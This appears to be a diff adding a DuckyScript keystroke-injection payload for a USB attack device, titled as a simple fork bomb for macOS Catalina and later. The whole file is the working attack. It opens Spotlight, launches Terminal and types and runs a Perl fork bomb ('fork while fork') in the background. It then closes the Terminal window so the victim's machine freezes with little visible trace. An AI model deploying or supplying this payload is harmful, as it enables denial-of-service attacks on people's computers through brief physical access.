@@ -1,0 +1,16 @@
+REM this payload was made by jkw16
+REM TITLE: simple_mac_forkbomb
+REM this payload is specifically made for macbooks
+REM this payload is a simple forkbomb for mac os catalina and higher
+DELAY 1500
+GUI SPACE
+DELAY 1000
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1500
+STRING perl -e "fork while fork" &
+DELAY 500
+ENTER
+DELAY 1000
+GUI w
